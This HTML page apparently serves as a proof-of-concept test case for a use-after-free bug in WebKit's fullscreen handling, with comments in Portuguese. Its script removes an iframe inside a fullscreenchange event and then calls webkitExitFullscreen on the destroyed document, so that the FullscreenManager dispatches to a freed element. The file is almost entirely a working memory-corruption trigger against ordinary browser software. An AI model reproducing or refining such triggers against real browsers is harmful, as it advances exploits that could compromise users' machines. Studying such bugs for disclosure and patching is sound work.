<html>
<body>
<button id="run">Run V2.1</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  V2.1: Idêntico ao V2, acrescenta webkitExitFullscreen() no iDoc
  DEPOIS de iframe.remove(). FullscreenManager tenta despachar
  evento para o Element* já freed.
*/
var iframe = document.getElementById("testFrame");
var popup  = null;

iframe.onload = function() {
    var iDoc = iframe.contentDocument;
    iDoc.open();
    iDoc.write(
        '<!DOCTYPE html><html><body>' +
        '<div style="width:200px;height:150px;background:blue"></div>' +
        '</body></html>'
    );
    iDoc.close();

    iDoc.addEventListener('webkitfullscreenchange', function() {
        document.getElementById("status").innerHTML = "child fullscreenchange";

        if (iframe && iframe.parentNode) iframe.remove();
        if (popup && !popup.closed) popup.close();

        // Novo: acessa FullscreenManager do Document destruído
        try {
            iDoc.webkitExitFullscreen();
            document.getElementById("status").innerHTML += " | exitFullscreen OK";
        } catch(e) {
            document.getElementById("status").innerHTML += " | EX:" + e;
        }
    });
};

document.getElementById("run").onclick = function() {
    popup = window.open("", "_blank", "width=400,height=300");
    popup.document.open();
    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
    popup.document.close();

    var iDoc = iframe.contentDocument;
    iDoc.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;
        popup.focus();
        window.focus();
        iframe.contentWindow.focus();

        setTimeout(function() {
            if (popup && !popup.closed) popup.close();
        }, 300);
    }, 300);
};
</script>
</body>
</html>
